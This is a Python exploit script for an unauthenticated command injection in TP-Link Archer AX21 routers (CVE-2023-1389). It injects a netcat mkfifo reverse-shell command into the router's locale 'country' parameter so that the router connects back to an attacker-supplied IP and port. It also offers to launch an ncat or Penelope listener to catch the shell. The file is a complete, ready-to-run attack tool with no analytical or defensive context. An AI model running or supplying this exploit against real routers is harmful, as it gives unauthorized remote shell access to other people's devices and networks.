#!/usr/bin/env python3

import requests
import urllib.parse
import argparse
import socket
import subprocess
import urllib3
from urllib3.exceptions import InsecureRequestWarning

urllib3.disable_warnings(InsecureRequestWarning)

def create_arg_parser():
    parser = argparse.ArgumentParser(description="Exploit for TP-Link Archer AX21 Unauthenticated Command Injection (CVE-2023-1389)")
    parser.add_argument("-r", "--router", dest="router", default="192.168.0.1", help="Router IP address")
    parser.add_argument("-a", "--attacker", dest="attacker", default="127.0.0.1", help="Attacker IP address")
    parser.add_argument("-p", "--port", dest="port", default="9999", help="Attacker port for reverse shell")
    parser.add_argument("-P", "--protocol", dest="protocol", choices=["http", "https"], default="http", help="Protocol to use (http or https)")
    parser.add_argument("--router-port", dest="router_port", type=int, help="Optional port to manually set the router port")
    parser.add_argument("--proxy", dest="proxy", help="Optional proxy to use (e.g., http://127.0.0.1:8080)")
    return parser

def generate_reverse_shell_command(attacker_ip, attacker_port):
    command = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {attacker_ip} {attacker_port} >/tmp/f"
    return urllib.parse.quote(command)

def execute_exploit(router_ip, router_port, reverse_shell_command, protocol, proxy=None):
    if protocol == "http":
        url_command = f"http://{router_ip}:{router_port}/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$({reverse_shell_command})"
    else:
        url_command = f"https://{router_ip}:{router_port}/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$({reverse_shell_command})"

    proxies = {"http": proxy, "https": proxy} if proxy else None

    try:
        for _ in range(2):
            response = requests.get(url_command, proxies=proxies, verify=False)
            if response.status_code != 200:
                print(f"{protocol.upper()} request failed with status code {response.status_code}")
            else:
                print(f"{protocol.upper()} request succeeded with status code {response.status_code}")
                return
    except requests.RequestException as e:
        print(f"{protocol.upper()} request failed: {e}")

def is_port_open(ip, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        return result == 0

def prompt_listener(attacker_ip, attacker_port):
    if not is_port_open(attacker_ip, int(attacker_port)):
        print("No listener detected on the specified port.")
        choice = input("Do you want to start a listener? (yes/ncat/penelope): ").strip().lower()
        
        netcat_choices = {'y', 'ye', 'yes', 'n', 'nc', 'ncat'}
        penelope_choices = {'p', 'pe', 'pen', 'pene', 'penel', 'penelo', 'penelop', 'penelope'}
        
        if choice in netcat_choices:
            try:
                subprocess.Popen(['ncat', '-lkvp', str(attacker_port)])
                print(f"Netcat listener started on port {attacker_port}")
            except FileNotFoundError:
                print("Netcat is not installed or not found in the PATH.")
        
        elif choice in penelope_choices:
            try:
                subprocess.Popen(['/opt/penelope/penelope.py', '-l', str(attacker_port)])
                print(f"Penelope listener started on port {attacker_port}")
            except FileNotFoundError:
                print("Penelope is not installed or not found in /opt/penelope/penelope.py.")
        
        else:
            print("No valid input provided. Please start a listener manually if required.")
    else:
        print("Listener already detected on the specified port.")

def main():
    parser = create_arg_parser()
    args = parser.parse_args()

    if args.router_port:
        router_port = args.router_port
    else:
        router_port = 80 if args.protocol == "http" else 443

    prompt_listener(args.attacker, args.port)
    reverse_shell_command = generate_reverse_shell_command(args.attacker, args.port)
    execute_exploit(args.router, router_port, reverse_shell_command, args.protocol, args.proxy)

if __name__ == "__main__":
    main()
